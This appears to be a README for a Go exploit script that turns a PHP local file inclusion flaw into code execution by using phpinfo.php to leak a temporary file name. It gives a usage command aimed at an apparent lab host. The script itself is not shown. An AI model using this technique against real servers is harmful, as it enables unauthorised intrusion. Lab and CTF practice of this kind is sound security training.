# lfi2rce_phpinfo.go

This script is used to exploit a Local File Inclusion (LFI) vulnerability by using phpinfo.php to generate a temporary file name and then using that file name to read the contents of a file.

## Usage

```bash
go run lfi2rce_phpinfo.go -phpinfo http://10.10.176.70/dashboard/phpinfo.php -lfi http://10.10.176.70/dev/index.html?view=%s
```
